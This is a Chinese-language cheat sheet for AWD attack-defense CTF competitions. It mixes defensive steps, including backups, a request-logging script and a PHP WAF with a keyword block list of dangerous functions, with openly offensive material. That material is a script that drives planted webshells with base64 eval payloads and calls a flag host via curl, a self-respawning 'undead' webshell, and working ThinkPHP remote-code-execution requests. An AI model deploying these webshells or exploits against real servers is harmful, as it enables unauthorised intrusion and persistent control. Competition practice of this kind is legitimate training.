# AWD

> 参考文章：
>
> https://blog.csdn.net/like98k/article/details/80261603

## 主要准备&起手式

### 1 改ssh密码

### 2 dump源码

* 使用XFTP或者FeilZilla Client等图形化工具

* 使用scp

```bash
scp -r -P Port remote_username@remote_ip:remote_folder local_file
```

### 3  备份数据库

1. 找配置文件

   找到用户名和密码之后登陆数据库

2. 备份

   ```bash
   [root@localhost ~]# cd /var/lib/mysql (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)
   [root@localhost mysql]# mysqldump -u root -p Test>Test0809.sql，输入密码即可。
   ```

3. 还原

   ```bash
   mysql -u root -p
   mysql>use 数据库
   然后使用source命令，后面参数为脚本文件(如这里用到的.sql)
   mysql>source d:/dbname.sql
   ```

### 4 查杀源码有没有后门

### 5 seay扫洞

### 6 <u>上监控脚本</u>

上一个监控流量的脚本。

```php
require_once('monitor.php');     // 监控流量
```

脚本内容如下：

```php
<?php

error_reporting(0);
define('LOG_FILEDIR','./logs');
function waf()
{
	if (!function_exists('getallheaders')) {
		function getallheaders() {
			foreach ($_SERVER as $name => $value) {
				if (substr($name, 0, 5) == 'HTTP_')
				$headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
			}
		return $headers;
		}
	}
	$get = $_GET;
	$post = $_POST;
	$cookie = $_COOKIE;
	$header = getallheaders();
	$files = $_FILES;
	$ip = $_SERVER["REMOTE_ADDR"];
	$method = $_SERVER['REQUEST_METHOD'];
	$filepath = $_SERVER["SCRIPT_NAME"];
	foreach ($_FILES as $key => $value) {
		$files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);
		file_put_contents($_FILES[$key]['tmp_name'], "Mz1111111111");
	}

	unset($header['Accept']);
	$input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);
	logging($input);
}

function logging($var){
	$filename = $_SERVER['REMOTE_ADDR'];
	$LOG_FILENAME = LOG_FILEDIR."/".$filename;
	$time = date("Y-m-d G:i:s");
	file_put_contents($LOG_FILENAME, "\r\n".$time."\r\n".print_r($var, true), FILE_APPEND);
	file_put_contents($LOG_FILENAME,"\r\n".'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'], FILE_APPEND);
	file_put_contents($LOG_FILENAME,"\r\n***************************************************************",FILE_APPEND);
}

waf();
?>
```

### 7 审计

### 8 时刻关注流量和积分榜

时刻看着自己的分数，看到自己被down了就赶紧恢复，不管被删库还是被自己删了什么重要配置文件或者还是上的通用waf脚本过不了check。

然后就是查看流量了。

### 9 写脚本日全场

脚本模板如下：（不太好用的亚子，需要改一改）

```python
import sys, requests, base64

def loadfile(filepath):
	try : 
		file = open(filepath,"rb")
		return str(file.read())
	except : 
		print("File %s Not Found!" %filepath)
		sys.exit()

def file_write(filepath,filecontent):
	file = open(filepath,"a")
	file.write(filecontent)
	file.close()

def getflag(url,method,passwd,flag_path):
	#flag机的url
	flag_url="192.168.45.1"
	#print url
	#判断shell是否存在
	try :
		res = requests.get(url,timeout=3)
	except : 
		print("[-] %s ERR_CONNECTION_TIMED_OUT" %url)
		file_write(flag_path,"[-] %s ERR_CONNECTION_TIMED_OUT\n\n" %url)
		return 0
	if res.status_code!=200 :
		print("[-] %s Page Not Found!" %url)
		file_write(flag_path,"[-] %s Page Not Found!\n\n" %url)
		return 0
	#执行命令来获取flag system,exec,passthru,`,shell_exec
	#a=@eval(base64_decode($_GET[z0]));&z0=c3lzdGVtKCJ3aG9hbWkiKTs=
	cmd = "curl "+flag_url
	#cmd = "whoami"
	getflag_cmd ="echo system(\"%s\");"%cmd
	data={}
	if method=='get':
		data[passwd]='@eval(base64_decode($_GET[z0]));'
		data['z0']=base64.b64encode(getflag_cmd)
		try:
			res = requests.get(url,params=data,timeout=3)
			#print res.url
			if res.content:
				content = url+"\n"+res.content+"\n\n"
				file_write(flag_path,content)
				print("[+] %s getflag sucessed!"%url)
			else :
				print("[-] %s cmd exec response is null!"%url)
				content = url+"\ncmd exec response is null!\n\n"
				file_write(flag_path,content)
		except :
			file_write(flag_path,"\n[+] %s Getflag Failed! You can check the shell's passwd!\n\n"%url)
			print("[+] %s Getflag Failed! You can check the shell's passwd!"%url)
	elif method=='post':
		data['pass']='Sn3rtf4ck'
		data[passwd]='@eval(base64_decode($_POST[z0]));'
		data['z0']=base64.b64encode(getflag_cmd)
		try:
			res = requests.post(url,data=data,timeout=3)
			if res.content:
				content = url+"\n"+res.content+"\n\n"
				file_write(flag_path,content)
				print("[+] %s getflag sucessed!"%url)
			else :
				print("[-] %s cmd exec response is null!"%url)
				content = url+"\ncmd exec response is null!\n\n"
				file_write(flag_path,content)
		except:
			file_write(flag_path,"\n[+] %s Getflag Failed! You can check the shell's passwd!\n\n"%url)
			print("[+] %s Getflag Failed! You can check the shell's passwd!"%url)
	


if __name__ == '__main__':
	#存放flag的文件
	flag_path="./flag.txt"
	shellstr=loadfile("./webshell.txt")
	list = shellstr.split("\r\n")
	#print str(list)
	i = 0
	url={}
	passwd={}
	method={}
	for data in list:
		if data:
			ls = data.split(",")
			method_tmp = str(ls[1])
			method_tmp = method_tmp.lower()
			if method_tmp=='post' or method_tmp=='get':
				url[i]=str(ls[0])
				method[i]=method_tmp
				passwd[i]=str(ls[2])
				i+=1
			else :
				print("[-] %s request method error!" %(str(ls[0])))
				file_write(flag_path,"[-] %s request method error!\n\n" %(str(ls[0])))
		else : pass
	#print str(len(url))
	for j in range(len(url)):
		#调用执行命令的模块
		#print str(j)
		#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])
		getflag(url=url[j],method=method[j],passwd=passwd[j],flag_path=flag_path)
	print("Getflag finished!")
```

#### 自己写的框架：

可控性比较高

```python
import requests
import sys
import base64
import time
import hashlib
import re


class Exploit:
	def __init__(self, attackList=[]):
		self.attackList = attackList     # servers to attack
		self._headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
			'Content-Type': 'application/x-www-form-urlencoded',
		}
		self.proxies = {     # proxies for burp
			'http': '127.0.0.1:8080',
			'https': '127.0.0.1:8080',
		}

	# auto exploit
	def exp(self):
		self.outPut('===========================ATTACK AT {}===================================\n'.format(time.strftime("%H:%M", time.localtime())))
		print(' > start attack')
		for url in self.attackList:
			print('   > now url '+url)
			self.outPut(' >'+url+'\n')
			try:
				self.payload(url)
			except:
				print('    *err')     # when error occured, find the reason in burp proxy
				self.outPut('     *err\n')
			print()

	# !!!put your payload here
	def payload(self, url):
		s = requests.Session()    # init session
		flag = ''
		#=========================================================================================
		#=====================================payload============================================
		# -------------------------easyUse-----------------------------
		# @ simpleRequests
		# r = s.get(url, headers=self._headers, proxies=self.proxies)
		# r = s.get(url, headers=self._headers)
		# r = s.get(url, headers=self._headers, allow_redirects=False)
		#
		# @ fileUpload
		# files = {'file': open('xxxx.txt', 'rb')}
		# r = s.post(url, files=files, headers=self._headers)
		# -------------------------easyUse-----------------------------
		
		r = s.get(url, headers=self._headers, proxies=self.proxies)
		flag = r.text.strip()
		
		#=====================================payload==============================================
		#=========================================================================================
		print('     >flag: '+flag)
		self.outPut('     >flag: '+flag+'\n')

	# write log
	def outPut(self, s):
		with open('./Mz1Log.txt', 'a') as f:
			f.write(s)


if __name__ == '__main__':
	'''
	url = 'http://127.0.0.1:'
	selfUrl = 'http://127.0.0.1:8030'      # my url or ip
	_list = [url+str(port) for port in range(8001,8051)]
	_list.remove(selfUrl)
	print(_list)
	'''
	_list = ['http://ctf.mz1.top/tmp/flag.txt']
	exp = Exploit(_list)
	exp.exp()
	print(' >>> over <<<')

```



## 进阶

### 强力 mzWaf.php

```php
<?php
    //init waf
    error_reporting(0);
    define('WAF_LOG_FILENAME','/tmp/wafLog.txt');    //not safe
    define('LOG_FILEDIR','/tmp/requestLogs');         // perhaps safe
	define('BAN_LIST_FILE','/tmp/ban.txt');      // ban ip
    if(!file_exists(LOG_FILEDIR)){
        mkdir(LOG_FILEDIR);   // create dir
    }

    //ban ip
    //black list
    function banIp(){
        if(file_exists(BAN_LIST_FILE)){
            $ipBanList = file(BAN_LIST_FILE);
            $ip = $_SERVER['REMOTE_ADDR'];
            foreach($ipBanList as $ban){
                if(trim($ban) === $ip){
                    $time = date("Y-m-d G:i:s");
                    file_put_contents(WAF_LOG_FILENAME, "\r\n\r\n  !!BAN".$time." -> ".$ip."\r\n", FILE_APPEND); // take log
                    die("Mz1_1s_S0_kawaii~~~~~~~~");
                }
            }
        }else{
            // Create file
            file_put_contents(BAN_LIST_FILE, "");
        }
    }

    
    //waf and take log
    function waf($end=true)
    {
        if (!function_exists('getallheaders')) {
            function getallheaders() {
                foreach ($_SERVER as $name => $value) {
                    if (substr($name, 0, 5) == 'HTTP_')
                        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
                }
                return $headers;
            }
        }
        $get = $_GET;
        $post = $_POST;
        $cookie = $_COOKIE;
        $header = getallheaders();
        $files = $_FILES;
        $ip = $_SERVER["REMOTE_ADDR"];
        $method = $_SERVER['REQUEST_METHOD'];
        $filepath = $_SERVER["SCRIPT_NAME"];
        //rewirte shell which uploaded by others, you can do more
        foreach ($_FILES as $key => $value) {
            $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);
            file_put_contents($_FILES[$key]['tmp_name'], "Mz1_1s_S0_kawaii~~~~~");
        }
        unset($header['Accept']);//fix a bug
        $input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);
        //take log
        logging($input);

        //deal with the Request
        $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";
        $pattern .= "|file_put_contents|fwrite|curl|system|eval|assert";
        $pattern .="|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";
        $pattern .="|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";
        $vpattern = explode("|",$pattern);
        $bool = false;
        foreach ($input as $k => $v) {
            foreach($vpattern as $value){
                foreach ($v as $kk => $vv) {
                    if (preg_match( "/$value/i", $vv )){
                        $bool = true;
                        wafLogging($input, $end);
                        break;
                    }
                }
                if($bool) break;
            }
            if($bool) break;
        }
    }

    //relative save request log
    function logging($var){
        $filename = $_SERVER['REMOTE_ADDR'];
        $LOG_FILENAME = LOG_FILEDIR."/".$filename;
        $time = date("Y-m-d G:i:s");
        file_put_contents($LOG_FILENAME, "\r\n".$time."\r\n".print_r($var, true), FILE_APPEND);
        file_put_contents($LOG_FILENAME,"\r\n".'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'], FILE_APPEND);
        file_put_contents($LOG_FILENAME,"\r\n***************************************************************",FILE_APPEND);
    }

    //not safe request log
    function wafLogging($var, $end){
        $time = date("Y-m-d G:i:s");
        file_put_contents(WAF_LOG_FILENAME, "\r\nip: ".$_SERVER['REMOTE_ADDR'], FILE_APPEND);   //log the ip
        file_put_contents(WAF_LOG_FILENAME,"\r\n".'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'], FILE_APPEND);
        file_put_contents(WAF_LOG_FILENAME, "\r\n".$time."\r\n".print_r($var, true), FILE_APPEND);
        file_put_contents(WAF_LOG_FILENAME, "\r\n================================================================", FILE_APPEND);
        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);
        if ($end === true){
            die('Mz1_1s_S0_kawaii~~~');
        }
    }

    //check ip
    banIp();
    //true means that waf will drop the request
    waf(false);

?>
```

一句话给所有文件上waf, 会比较诡异，建议不要使用：

```bash
find /var/www/html -type f -path "*.php" | xargs sed -i "s/<?php/<?phpnrequire_once('/tmp/waf.php');n/g"
```



### 不死马

```php
<?php
    set_time_limit(0);                   // 不限制执行时间
    ignore_user_abort(1);                 // 断开连接继续执行
    unlink(__FILE__);                    // 删除自身
    while(1){                            // 循环生成webshell
        file_put_contents('path/mz.php','<?php @eval($_REQUEST["mz"]);?>');
    }

?>
```



## EXP

### Thinkphp 5.0.22、5.1.29

exp:

```
http://node4.buuoj.cn:27081/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=&vars[1][]=-1
```

### Thinkphp 5.0.23

exp:

```
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

### Thinkphp 2.x

exp:

```
http://node4.buuoj.cn:27592/index.php?s=/index/index/name/$%7B@system(env)%7D
```

